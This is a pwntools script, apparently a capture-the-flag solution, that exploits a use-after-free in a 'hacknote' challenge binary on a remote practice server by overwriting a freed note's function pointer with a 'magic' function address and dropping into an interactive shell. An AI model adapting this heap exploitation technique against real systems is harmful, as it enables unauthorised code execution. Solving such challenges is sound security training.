from pwn import *

context.log_level = 'debug'
# io = process('hacknote')
io = remote('node4.buuoj.cn', 27901)
elf = ELF('hacknote')
magic = elf.symbols['magic']

def add(size, content):
	io.sendlineafter('Your choice :', '1')
	io.sendlineafter('Note size :', str(size))
	io.sendafter('Content :', content)


def delete(index):
	io.sendlineafter('Your choice :', '2')
	io.sendlineafter('Index :', str(index))


def Print(index):
	io.sendlineafter('Your choice :', '3')
	io.sendlineafter('Index :', str(index))


def pwn():
	add(0x20, 'a' * 0x20)
	add(0x20, 'b' * 0x20)
	delete(0)
	delete(1) 
	add(8, p32(magic) + p32(0))
	Print(0)
	io.interactive()


if __name__ == '__main__':
	pwn()
